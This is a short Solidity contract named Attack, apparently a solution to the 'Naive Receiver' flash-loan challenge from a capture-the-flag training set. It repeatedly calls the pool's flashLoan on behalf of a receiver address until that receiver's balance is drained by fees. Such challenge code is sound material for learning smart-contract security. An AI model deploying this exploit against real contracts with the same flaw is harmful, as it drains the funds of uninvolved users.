// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title Attack
 * @author Thadeu Tucci
 */
contract Attack {
    NaiveReceiverLenderPool pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }
    // Function called by the pool during flash loan
    function attack(address hackContract) public {
        while (hackContract.balance > 0) {
            pool.flashLoan(hackContract, 10);
        }
    }
}